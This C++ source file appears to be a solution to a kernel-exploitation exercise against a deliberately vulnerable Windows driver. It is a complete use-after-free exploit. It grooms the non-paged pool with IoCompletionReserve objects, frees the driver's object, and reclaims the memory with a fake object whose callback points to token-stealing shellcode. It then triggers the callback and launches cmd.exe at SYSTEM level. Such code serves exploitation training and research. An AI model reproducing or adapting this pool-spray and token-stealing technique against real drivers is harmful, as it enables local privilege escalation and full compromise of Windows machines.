#include <Windows.h>
#include <iostream>
#include "winternl.h"

#include "Solutions.h"
#include "ioctal_codes.h"
#include "utils.h"

enum class Commands {
	AllocateUAFObject,
	FreeUAFObject,
	AllocateFakeObject,
	UseUafObject
};

typedef struct UAFStruct {
	INT callback;
	CHAR buf[0x54];
} UAFStruct;

typedef NTSTATUS(WINAPI* NtAllocateReserveObject_t) (
	OUT PHANDLE hObject,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN DWORD ObjectType);

NTSTATUS Command(HANDLE deviceHandle, Commands operate);
NTSTATUS SprayHeap();
DWORD getIoctl(Commands operate);

NTSTATUS Solutions::TriggerUAF() {
	
	// allocate 
	// free
	// allocate fake object
	// overwrite callback
	// use
	NTSTATUS res = SprayHeap();
	if (!NT_SUCCESS(res)) {
		return res;
	}

	if (!NT_SUCCESS(Command(_hDeviceHandle, Commands::AllocateUAFObject))) {
		std::cout << "[-] Could not allocate UAF object" << std::endl;
		return STATUS_INVALID_PARAMETER;
	}
	std::cout << "[+] Allocated UAF object" << std::endl;

	if (!NT_SUCCESS(Command(_hDeviceHandle, Commands::FreeUAFObject))) {
		std::cout << "[-] Could not free UAF object" << std::endl;
		return STATUS_INVALID_PARAMETER;
	}
	std::cout << "[+] Freed UAF object" << std::endl;

	DWORD dwBytesReturned = 0;
	UAFStruct* lpInBuffer = (UAFStruct*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(UAFStruct));
	if (!lpInBuffer) {
		std::cout << "[-] Could not allocate buffer" << std::endl;
		return STATUS_NO_MEMORY;
	}

	lpInBuffer->callback = (ULONG)&token_stealing_shellcode_write_what_where;
	memset(lpInBuffer->buf, 0x41, 0x54);
	std::cout << "[+] token stealing shellcode " << std::hex << (ULONG)&token_stealing_shellcode_write_what_where << std::endl;
	
	if (!DeviceIoControl(_hDeviceHandle, IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED,
		(PVOID)lpInBuffer, sizeof(UAFStruct), NULL, NULL, &dwBytesReturned, NULL)) {
		std::cout << "[-] Could not talk with the driver" << std::endl;
		return STATUS_INVALID_PARAMETER;
	}
	std::cout << "[+] Allocated fake object" << std::endl;
	
	if (!NT_SUCCESS(Command(_hDeviceHandle, Commands::UseUafObject))) {
		std::cout << "[-] Could not use UAF object" << std::endl;
		return STATUS_INVALID_PARAMETER;
	}
	std::cout << "[+] Calling UAF callback -- enjoy system :)" << std::endl;

	system("cmd.exe");

	return 0;
}

static NTSTATUS Command(HANDLE deviceHandle, Commands operate) {
	
	DWORD dwBytesReturned = 0;
	return
		DeviceIoControl(deviceHandle,
			getIoctl(operate),
			NULL,
			NULL,
			NULL,
			NULL,
			&dwBytesReturned,
			NULL
		);
}

static NTSTATUS SprayHeap() {
	const DWORD hArrSize = 8000 + 5000;
	auto NtAllocateReserveObject = (NtAllocateReserveObject_t)GetProcAddress(GetModuleHandle(L"ntdll.dll"),
																				"NtAllocateReserveObject");
	
	if (!NtAllocateReserveObject) {
		std::cout << "[-] Could not load NtAllocateResearveObject - " << GetLastError() << std::endl;
		return STATUS_DLL_NOT_FOUND;
	}

	NTSTATUS status = 0;
	PHANDLE hIoCo = (PHANDLE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, hArrSize * sizeof(HANDLE));
	if (!hIoCo) {
		std::cout << "[-] Could not allocate buffer" << std::endl;
		return STATUS_NO_MEMORY;
	}

	std::cout << "[+] Spraying non paged pool with IoCo objects" << std::endl;
	for (int i = 0; i < 8000 + 5000; i++) {
		status = NtAllocateReserveObject(&hIoCo[i], NULL, 1); // 1 = IoCo - > IoCompletionReserve 
		if (!NT_SUCCESS(status)) {
			std::cout << "[-] Could not allocate IoCo object - " << GetLastError() << std::endl;
			return STATUS_NO_MEMORY;
		}
	}

	std::cout << "[+] Creating holes in the pool" << std::endl;
	BOOLEAN shouldFree = true;
	for (int i = 8000; i < 13000; i++) {
		shouldFree && CloseHandle(hIoCo[i]);
		shouldFree = !shouldFree;
	}

	return 0; // STATUS_SUCCESS
}

static DWORD getIoctl(Commands operate) {
	switch (operate) {
	case Commands::AllocateUAFObject:
		return IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED;
	case Commands::FreeUAFObject:
		return IOCTL_FREE_UAF_NON_PAGED;
	case Commands::UseUafObject:
		return IOCTL_USE_UAF_NON_PAGED;
	}

	return STATUS_INVALID_PARAMETER;
}